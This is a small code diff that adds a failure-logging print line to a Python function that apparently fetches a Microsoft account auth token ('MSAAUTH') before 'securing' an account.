@@ -9,6 +9,7 @@ def startSecuringAccount(email: str, device: str = None, code: str = None):
     msaauth = getMSAAUTH(email, device, code)
     
     if msaauth is None:
+        print("[-] - Failed to get MSAAUTH")
         return msaauth
     
     print("[+] - Got MSAAUTH | Starting to secure...")
